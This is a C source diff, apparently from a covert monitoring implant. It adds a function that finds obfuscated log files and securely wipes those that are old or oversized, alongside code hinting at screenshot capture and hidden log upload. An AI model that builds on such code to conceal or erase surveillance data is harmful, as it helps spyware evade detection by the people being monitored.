@@ -51,6 +51,7 @@ log_entry_struct log_table[MAX_LOG_ENTRIES];
 
 // Dichiarato in SM_EventHandlers.h
 extern BOOL IsGreaterDate(nanosec_time *, nanosec_time *);
+extern BOOL IsNewerDate(FILETIME *date, FILETIME *dead_line);
 
 // In BitmapCommon
 extern void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality);
@@ -1107,6 +1108,46 @@ void Log_Sanitize(char *name)
 }
 
 
+// Cancella i log troppo vecchi o troppo "ciccioni"
+#define SECS_TO_FT_MULT 10000000
+void LOG_Purge(long long f_time, DWORD size)
+{
+	char log_file_path[DLLNAMELEN];
+	WIN32_FIND_DATA FindFileData;
+	char DirSpec[DLLNAMELEN];  
+	char *scrambled_search;
+	HANDLE hFind = INVALID_HANDLE_VALUE;
+	LARGE_INTEGER li;  
+	FILETIME ft;
+	
+	if (f_time==0 && size==0)
+		return;
+
+	li.QuadPart = f_time * SECS_TO_FT_MULT;
+	ft.dwLowDateTime = li.LowPart;
+	ft.dwHighDateTime = li.HighPart;
+
+	scrambled_search = LOG_ScrambleName("*.log", crypt_key[0], TRUE);
+	if (!scrambled_search)
+		return;
+
+	HM_CompletePath(scrambled_search, DirSpec);
+	SAFE_FREE(scrambled_search);
+
+	hFind = FNC(FindFirstFileA)(DirSpec, &FindFileData);
+	if (hFind == INVALID_HANDLE_VALUE) 
+		return;
+	do {
+		if ( (size && (FindFileData.nFileSizeHigh>0 || FindFileData.nFileSizeLow>=size)) ||
+			(f_time && IsNewerDate(&ft, &FindFileData.ftCreationTime))) {
+			HM_CompletePath(FindFileData.cFileName, log_file_path);
+			HM_WipeFileA(log_file_path);
+		}
+	} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
+	FNC(FindClose)(hFind);
+}
+
+
 // Scambia la coda di log attiva con quella inattiva
 void Log_SwitchQueue()
 {
@@ -1372,7 +1413,6 @@ BOOL LOG_SendLogQueue(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
 	ASP_Bye();
 	return TRUE;
 }
-
 
 // Se in wildpath e' presente una wildcard la sosituisce con file_name
 // e mette comunque tutto in dest_path.
